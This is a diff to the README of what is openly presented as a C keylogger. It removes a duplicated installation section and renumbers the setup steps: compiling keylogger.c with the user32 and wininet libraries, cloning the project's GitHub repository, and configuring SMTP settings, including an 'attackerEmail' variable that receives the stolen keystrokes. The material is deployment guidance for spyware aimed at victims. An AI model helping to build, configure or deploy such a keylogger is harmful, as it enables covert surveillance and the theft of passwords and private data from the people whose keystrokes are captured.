@@ -26,17 +26,13 @@
    Compile your code with a C compiler. For example:
    ```bash
    gcc -o keylogger keylogger.c -luser32 -lwininet
-## Installation
 
-1. **Compile the Code**:
-   Compile your code with a C compiler. For example:
-   ```bash
-   gcc -o keylogger keylogger.c -luser32 -lwininet
-2. **Clone The Project:**
+
+3. **Clone The Project:**
    ``
    git clone https://github.com/archescyber/arx-c-keylogger
    ``
-3. **Configure SMTP Settings:**
+4. **Configure SMTP Settings:**
  Fill in the following SMTP settings with your information:
 
 ```char attackerEmail[] = "your_attacker_email@gmail.com"; // Attacker's email address
